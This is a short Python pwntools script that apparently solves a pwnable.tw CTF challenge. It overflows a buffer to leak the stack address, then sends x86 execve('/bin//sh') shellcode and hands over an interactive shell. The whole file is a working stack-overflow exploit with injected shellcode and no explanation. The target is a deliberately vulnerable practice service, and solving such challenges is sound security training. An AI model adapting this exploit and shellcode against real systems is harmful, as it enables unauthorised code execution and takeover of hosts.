from pwn import *

context.log_level='DEBUG'

r=remote('chall.pwnable.tw',10000)

r.recvuntil("Let's start the CTF:")
payload='a'*20+p32(0x08048087)
r.send(payload)
esp=u32(r.recv(4))
success(hex(esp))

#r.recvuntil("Let's start the CTF:\n")
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload='a'*20+p32(esp+20)+shellcode

r.sendline(payload)

r.interactive()